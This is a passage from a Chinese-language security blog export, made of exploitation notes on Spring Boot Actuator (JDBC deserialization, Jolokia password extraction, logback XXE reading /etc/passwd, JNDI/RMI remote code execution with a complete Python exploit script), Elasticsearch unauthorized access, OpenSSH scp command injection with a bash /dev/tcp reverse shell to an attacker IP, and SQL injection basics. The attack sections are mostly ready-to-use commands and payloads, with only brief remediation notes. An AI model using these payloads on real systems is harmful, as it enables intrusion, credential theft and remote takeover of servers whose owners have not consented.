<h4 id="MySQL-jdbc-反序列化"><a href="#MySQL-jdbc-反序列化" class="headerlink" title="MySQL jdbc 反序列化"></a>MySQL jdbc 反序列化</h4><p>1.查看环境依赖</p>
<p>在<code>/env</code>端点中查找<code>mysql-connector-java</code>依赖,并查看版本号（5.x或者8.x）</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值</p>
<p>2.在公网web服务器上运行python脚本</p>
<p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py</a></p>
<p>利用ysoserial生成 payload.ser 反序列化 payload 文件，供脚本使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>3.设置 <code>spring.datasource.url</code> 属性</p>
<p>根据 /env 接口暴露的属性名 spring.datasource.url ，和实际的 mysql-connector-java 版本，设置 jdbc url</p>
<p>mysql-connector-java 5.x</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>mysql-connector-java 8.x</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>spring boot 1.x</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring boot 2.x</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>4.访问/refresh端点刷新配置</p>
<p>spring boot 1.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring boot 2.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>

<p>5.触发数据查询，即可触发反序列化漏洞，反序列化漏洞利用完成后,恢复 <code>spring.datasource.url</code> 的原始 value 值</p>
<h3 id="mappings"><a href="#mappings" class="headerlink" title="/mappings"></a>/mappings</h3><p>获取应用所有接口列表，可能导致接口被恶意攻击，影响接口正常使用</p>
<p>可能存在未授权接口</p>
<h3 id="trace"><a href="#trace" class="headerlink" title="/trace"></a>/trace</h3><p>获取认证信息（Cookie、tooken、Session），利用认证信息访问接口，比如伪造cookie登录</p>
<h3 id="jolokia-list"><a href="#jolokia-list" class="headerlink" title="/jolokia/list"></a>/jolokia/list</h3><h4 id="调用-org-springframework-bootMbean"><a href="#调用-org-springframework-bootMbean" class="headerlink" title="调用 org.springframework.bootMbean"></a>调用 org.springframework.bootMbean</h4><p>通过<code>org.springframework.bootMbean</code>获取/env中被隐藏的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<h4 id="调用-org-springframework-cloud-context-environmentMbean"><a href="#调用-org-springframework-cloud-context-environmentMbean" class="headerlink" title="调用 org.springframework.cloud.context.environmentMbean"></a>调用 org.springframework.cloud.context.environmentMbean</h4><p>通过<code>org.springframework.cloud.context.environmentMbean</code>获取/env中被隐藏的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<h4 id="reloadByURL方法"><a href="#reloadByURL方法" class="headerlink" title="reloadByURL方法"></a>reloadByURL方法</h4><p>可能存在logback 库提供的reloadByURL方法</p>
<p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞</p>
<p><strong>XXE漏洞实现</strong></p>
<p>创建<code>logback.xml</code>和<code>fileread.dtd</code>文件</p>
<p><code>logback.xml</code>中写入公网web服务器地址</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>fileread.dtd</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>把创建的<code>logback.xml</code>和<code>fileread.dtd</code>文件上传到公网web服务器下</p>
<p>远程访问<code>logback.xml</code>文件，其中<code>www.xxx.com</code>是靶机的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http://x.x.x.x/logback.xml</span><br></pre></td></tr></table></figure>

<p>然后就可以成功通过XXE读取到etc/passwd文件内容</p>
<p><strong>RCE远程代码执行</strong></p>
<p>下载RCE代码</p>
<p><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
<p>修改<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java</code>的代码</p>
<p>可以修改RMI远程监听的端口，和反弹shell的地址和端口</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt3c2guyqhj60xc0bs0zg02.jpg" alt="Spring Boot RCE.png"></p>
<p>利用maven对Java代码进行编译打包</p>
<p>进入<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer</code>目录，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包后创建target目录下生成<code>RMIServer-0.1.0.jar</code>文件</p>
<p>修改<code>logback.xml</code>的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>把RMIServer-0.1.0.jar文件上传到公网web服务器上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过<code>Djava.rmi.server.hostname=x.x.x.x</code>指定自己的RMI监听的外网地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-<span class="number">0.1</span><span class="number">.0</span>.jar</span><br></pre></td></tr></table></figure>

<p>使用NC监听反弹shell指定的窗口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>访问靶机url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http://x.x.x.x/logback.xml</span><br></pre></td></tr></table></figure>



<h4 id="createJNDIRealm方法"><a href="#createJNDIRealm方法" class="headerlink" title="createJNDIRealm方法"></a>createJNDIRealm方法</h4><p>查看<code>/jolokia/list</code>中存在的是否存在<code>org.apache.catalina.mbeans.MBeanFactory</code>类提供的<code>createJNDIRealm</code>方法，可能存在JNDI注入，导致远程代码执行</p>
<p>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入<br>可以使用burp一步步重放，也可以直接使用python脚本执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用jar包-RMIServer-0.1.0.jar，运行RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>使用NC监听反弹shell指定的窗口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>使用python发送请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python EXP.py http://x.x.x.x/</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.禁用<code>/actuator/</code>页面以及子路径，适用于spring 2.x</p>
<p>2.禁用所有接口，将配置改成<code>endpoints.enabled = false</code></p>
<p>3.在<code>pom.xml</code>引入<code>spring-boot-starter-security</code>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>application.properties</code>中开启security功能，配置访问权限验证,然后重启生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.port=8080</span><br><span class="line">management.security.enabled=true</span><br><span class="line">security.user.name=xxxxx</span><br><span class="line">security.user.password=xxxxxx</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>开发框架漏洞</category>
        <category>未授权访问漏洞</category>
        <category>Spring Boot</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Elasticsearch未授权访问</title>
    <url>//9db3aff65775.html</url>
    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
<p>返回内容包含<code>You Know,for Search</code></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_cat</span><br><span class="line">/_cat/allocation</span><br><span class="line">/_cat/shards</span><br><span class="line">/_cat/shards/&#123;index&#125;</span><br><span class="line">/_cat/master</span><br><span class="line">/_cat/nodes</span><br><span class="line">/_cat/tasks</span><br><span class="line">/_cat/indices</span><br><span class="line">/_cat/indices/&#123;index&#125;</span><br><span class="line">/_cat/segments</span><br><span class="line">/_cat/segments/&#123;index&#125;</span><br><span class="line">/_cat/count</span><br><span class="line">/_cat/count/&#123;index&#125;</span><br><span class="line">/_cat/recovery</span><br><span class="line">/_cat/recovery/&#123;index&#125;</span><br><span class="line">/_cat/health</span><br><span class="line">/_cat/pending_tasks</span><br><span class="line">/_cat/aliases</span><br><span class="line">/_cat/aliases/&#123;alias&#125;</span><br><span class="line">/_cat/thread_pool</span><br><span class="line">/_cat/thread_pool/&#123;thread_pools&#125;</span><br><span class="line">/_cat/plugins</span><br><span class="line">/_cat/fielddata</span><br><span class="line">/_cat/fielddata/&#123;fields&#125;</span><br><span class="line">/_cat/nodeattrs</span><br><span class="line">/_cat/repositories</span><br><span class="line">/_cat/snapshots/&#123;repository&#125;</span><br><span class="line">/_cat/templates</span><br><span class="line">/_cat/ml/anomaly_detectors</span><br><span class="line">/_cat/ml/anomaly_detectors/&#123;job_id&#125;</span><br><span class="line">/_cat/ml/trained_models</span><br><span class="line">/_cat/ml/trained_models/&#123;model_id&#125;</span><br><span class="line">/_cat/ml/datafeeds</span><br><span class="line">/_cat/ml/datafeeds/&#123;datafeed_id&#125;</span><br><span class="line">/_cat/ml/data_frame/analytics</span><br><span class="line">/_cat/ml/data_frame/analytics/&#123;id&#125;</span><br><span class="line">/_cat/transforms</span><br><span class="line">/_cat/transforms/&#123;transform_id&#125;</span><br><span class="line">/_river/_searc</span><br><span class="line">/_river/_search 查看数据库敏感信息</span><br><span class="line">/_nodes 查看节点数据</span><br><span class="line">/_plugin/head/  如有安装head插件 web管理界面</span><br><span class="line">/_search?pretty=true 查询所有index,type</span><br><span class="line">/index/_search	查询某个index下所有type</span><br><span class="line">/index/type/_search?pretty=true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>



<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
<p>2.禁止外网访问</p>
<p>3.认证插件安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/elasticsearch/plugins/http-basic  //es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https://github.com/Asquera/elasticsearch-http-basic/releases/download/v1.1.0/elasticsearch-http-basic-1.1.0.jar  //下载es认证插件</span><br></pre></td></tr></table></figure>

<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">配置名</th>
<th align="center">默认值</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http.basic.enabled</td>
<td align="center">true</td>
<td align="center">开关，开启会接管全部HTTP连接</td>
</tr>
<tr>
<td align="center">http.basic.user</td>
<td align="center">“admin”</td>
<td align="center">账号</td>
</tr>
<tr>
<td align="center">http.basic.password</td>
<td align="center">“admin”</td>
<td align="center">密码</td>
</tr>
<tr>
<td align="center">http.basic.ipwhitelist</td>
<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
</tr>
<tr>
<td align="center">http.basic.trusted_proxy_chains</td>
<td align="center">[“172.16.18.114”]</td>
<td align="center">信任代理列表</td>
</tr>
<tr>
<td align="center">http.basic.log</td>
<td align="center">false</td>
<td align="center">把无授权的访问事件添加到ES的日志</td>
</tr>
<tr>
<td align="center">http.basic.xforward</td>
<td align="center">“X-Forwarded-For”</td>
<td align="center">记载代理路径的header字段名</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>常规漏洞</category>
        <category>Elasticsearch</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
    <url>//b5e4a9195b88.html</url>
    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
<li>Openssh &lt;= 8.3p1</li>
</ul>
<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
<li>Openssh &lt;= 8.3p1</li>
<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
<li>知道SSH密码</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#x27;`pwd` /home&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>



<p>靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#x27;`bash -i &gt;&amp; /dev/tcp/192.168.0.1/8432 0&gt;&amp;1` /home/test.txt&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
<p>使用rsync代替scp</p>
<p>官方暂无补丁</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>命令注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入漏洞</title>
    <url>//9958bd672d7e.html</url>
    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where user_id = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>

<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where user_id = &#x27;1&#x27; or 1 = 1 --+</span><br></pre></td></tr></table></figure>

<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
<p><strong>在MySQL5.0以下</strong>，没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
<p><strong>在MySQL5.0以上</strong>，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
<p><strong>information_schema数据库中三个很重要的表：</strong></p>
<p><strong>information_schema.schemata</strong>:  该数据表存储了mysql数据库中的所有数据库的库名</p>
<p><strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名</p>
<p><strong>information_schema.columns</strong>:    该数据表存储了mysql数据库中的所有列的列名</p>
<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
<li>database()：当前数据库</li>
<li>user()：查询数据库的用户</li>
<li>version()：查询数据库版本</li>
<li>system_user()：系统用户名</li>
<li>session_user()：链接数据库的用户名</li>
<li>current_user：当前用户名</li>
<li>load_file()：读取本地文件</li>
<li>@@datadir：读取数据库路径</li>
<li>@@basedir：MySQL安装路径</li>
<li>@@version_complie_os：查看操作系统</li>
</ul>
<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
<ul>
<li>数字类型的注入</li>
<li>字符类型的注入</li>
<li>搜索类型的注入</li>
</ul>
<p><strong>依据提交方式分类</strong></p>
<ul>
<li>GET注入</li>
<li>POST注入</li>
<li>COOKIE注入</li>
<li>HTTP头注入（XFF注入、UA注入、REFERER注入）</li>
</ul>
<p><strong>依据获取信息的方式分类</strong></p>
<ul>
<li>基于布尔的盲注</li>
<li>基于时间的盲注</li>
<li>基于报错的盲注</li>
<li>联合查询注入</li>
<li>堆查询注入（可同时执行多条语句）</li>
</ul>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">指纹</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MySQL</td>
<td align="center">information_schema.tables</td>
</tr>
<tr>
<td align="center">Access</td>
<td align="center">msysobjects</td>
</tr>
<tr>
<td align="center">SQL server</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">Oracle</td>
<td align="center">dual</td>
</tr>
</tbody></table>
